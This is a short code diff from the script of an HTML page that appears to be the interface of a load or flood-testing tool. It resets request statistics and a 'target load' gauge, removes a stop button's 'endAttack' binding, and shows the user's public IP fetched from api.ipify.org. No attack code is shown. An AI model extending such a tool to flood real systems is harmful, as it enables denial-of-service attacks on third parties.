+            stats = { ok: 0, err: 0, total: 0, liveRps: 0, latencies: [] };
+            targetLoad = 0;
+            ui.targetLoadFill.style.width = '0%';
+            ui.targetLoadVal.innerText = 'Idle';
+            addLog("Core reset complete. Standby for deployment.", "info");
         };
 
-        ui.stop.onclick = endAttack;
-
-        // LOCAL NODE IP DATA
+        // Network ID Fetch
         fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => {
-            ui.node.innerText = `Node Link: ${d.ip} // ENCRYPTED`;
+            ui.node.innerText = d.ip;
         }).catch(() => {});
+
     </script>
 </body>
 </html>
